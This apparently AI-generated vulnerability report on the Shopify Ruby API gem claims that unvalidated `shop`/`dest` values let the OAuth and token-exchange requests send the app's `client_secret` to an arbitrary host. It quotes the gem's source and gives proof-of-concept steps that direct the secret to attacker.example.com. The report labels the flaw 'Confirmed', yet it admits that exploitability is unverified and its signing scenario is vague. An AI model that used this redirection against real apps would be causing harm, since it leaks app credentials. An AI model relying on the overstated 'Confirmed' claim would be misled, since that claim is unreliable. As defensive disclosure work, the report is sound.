Confirmed: `HttpClient#initialize` builds `@base_uri` from `session.shop` (attacker-influenced string, coming from `AuthQuery#shop` or the `dest` claim of a JWT) with no allow-listing to `*.myshopify.com`, and this same `@base_uri` is the destination that later carries the `client_id`/`client_secret` body in `Oauth.validate_auth_callback` and `TokenExchange.exchange_token`.

### Title
OAuth callback and token-exchange `shop`/`dest` value is not validated as a `myshopify.com` host before it is used as the request target that carries `client_secret` - ([File: lib/shopify_api/clients/http_client.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` and `ShopifyAPI::Auth::TokenExchange.exchange_token` both take a `shop` value from attacker-reachable input (`AuthQuery#shop`, taken from the OAuth callback query string, and `JwtPayload#dest`/`#shop`, decoded from a session token) and use it, unvalidated, to build the `HttpClient` base URI that receives the POST containing `client_id`/`client_secret` [1](#0-0) [2](#0-1) [3](#0-2) .

### Finding Description
The equality this code relies on is: `host that is HMAC/JWT-authenticated == host that receives the client_secret`. In `Oauth.validate_auth_callback`, the HMAC covers `shop`, `code`, `state`, `timestamp`, `host` as a signed string via `AuthQuery#to_signable_string` [4](#0-3) , and `Utils::HmacValidator.validate` only checks that the *content* of these fields matches a valid signature computed with the app's own secret — it never checks that `auth_query.shop` is a `*.myshopify.com` (or otherwise Shopify-owned) domain [5](#0-4) . That unchecked `shop` string is then handed straight into `Auth::Session.new(shop: auth_query.shop)` and used to build the `HttpClient`, whose constructor sets `@base_uri = "https://#{api_host || session.shop}"` with no host-format validation [6](#0-5) [3](#0-2) . The POST body containing `client_id: Context.api_key, client_secret: Context.api_secret_key, code: auth_query.code` is then sent to that attacker-controlled host [7](#0-6) .

The same pattern exists in `TokenExchange.exchange_token`, where `dest_shop = jwt_payload.shop` (derived from the JWT `dest` claim, which is only cryptographically checked for signature/expiry/audience, not domain format) is used unvalidated to build the request host that carries `client_secret` in the token-exchange body [2](#0-1) [8](#0-7) .

The HMAC/JWT signature proves the *bytes* have not been altered by a third party after signing by whoever holds the secret — it does not prove the `shop`/`dest` value is a genuine Shopify shop domain. Because an OAuth callback's `shop`/`code`/`state`/`timestamp`/`host` combination, or a JWT's claims, can contain any string an attacker chooses when driving their own installation flow (e.g. `shop=attacker.example.com`), and the HMAC/JWT signature only certifies that *those exact bytes* were signed, the check "authenticated bytes" is satisfied while the equality "authenticated host == host receiving `client_secret`" is violated: the library will happily direct the credential-bearing POST to `https://attacker.example.com/admin/oauth/access_token`.

### Impact Explanation
This is SSRF carrying the app's `client_id`/`client_secret` (and, in the OAuth code-grant callback, the merchant's `code` value) to an attacker-chosen host, which maps to the "High - SSRF with the app's credentials" category. If reachable, an attacker-controlled server would directly receive the app's `client_secret`, allowing full app impersonation for any real merchant (theft of the platform's `client_secret` escalates further to Critical-level compromise of every tenant's OAuth flow).

### Likelihood Explanation
Exploitability hinges on whether Shopify's own OAuth/token-exchange redirect and session-token issuance flows can ever be coerced into emitting a non-`myshopify.com` `shop`/`dest` value that reaches this code — this gem's own validation does not enforce that format anywhere in the reviewed files (`lib/shopify_api/auth/oauth.rb`, `lib/shopify_api/auth/oauth/auth_query.rb`, `lib/shopify_api/utils/hmac_validator.rb`, `lib/shopify_api/auth/jwt_payload.rb`, `lib/shopify_api/auth/token_exchange.rb`, `lib/shopify_api/clients/http_client.rb`). I could not verify within the indexed files whether Shopify's issuing systems themselves constrain the `dest`/`shop` value before signing, which materially affects likelihood; this would need confirmation via a live session-token/OAuth-callback sample or Shopify's published token-format guarantees, which are outside this index.

### Recommendation
Validate that `shop` (from `AuthQuery`) and `dest`/`shop` (from `JwtPayload`) match the `*.myshopify.com` domain pattern (or the documented dev-store suffix) before constructing any `HttpClient`, and reject the callback/exchange with `InvalidOauthError`/`InvalidJwtTokenError` otherwise, in `lib/shopify_api/auth/oauth.rb`, `lib/shopify_api/auth/jwt_payload.rb`, and `lib/shopify_api/auth/token_exchange.rb`.

### Proof of Concept
1. Attacker drives their browser to the app's own `/auth/login` route with `shop=attacker.example.com`, or otherwise causes an OAuth callback / session token to be produced with `shop`/`dest` = `attacker.example.com` while keeping the rest of the query/JWT internally consistent so it is validly signed by the app's own secret (e.g. by controlling the values submitted before the HMAC/JWT is computed by the app itself, or replaying a signed artifact whose `shop` field is attacker-chosen at signing time).
2. The app calls `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)` or `TokenExchange.exchange_token(session_token:, ...)`.
3. `Utils::HmacValidator.validate` / `JwtPayload.new` succeed because the signature matches the (attacker-chosen) bytes — no host-format check is performed.
4. `Clients::HttpClient.new(session: Auth::Session.new(shop: "attacker.example.com"), base_path: "/admin/oauth")` builds `@base_uri = "https://attacker.example.com"`.
5. `client.request(... path: "access_token", body: { client_id:, client_secret:, code: ... })` sends the app's `client_secret` to `https://attacker.example.com/admin/oauth/access_token` [9](#0-8) .

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-98)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

**File:** lib/shopify_api/auth/token_exchange.rb (L40-65)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-22)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-50)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```
